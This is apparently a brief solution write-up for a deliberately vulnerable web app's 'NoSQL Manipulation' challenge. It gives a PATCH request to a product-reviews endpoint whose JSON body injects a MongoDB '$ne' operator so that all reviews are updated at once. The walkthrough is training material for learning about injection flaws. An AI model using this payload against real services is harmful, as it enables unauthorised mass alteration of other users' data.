# NoSQL Manipulation
Instructions:
    Update multiple product reviews at the same time.

## Solution

Via reading the `Source-Code` we found few endpoints
read `www.netsparker.com/blog/web-security/what-is-nosql-injection`

`/rest/products/reviews` (Patch)
`reset/


Send `PATCH` request to `/rest/products/reviews`

Here is the body (json)
```json
{
    "message": "taltool",
    "id":{
        "$ne": -1
    }
}
```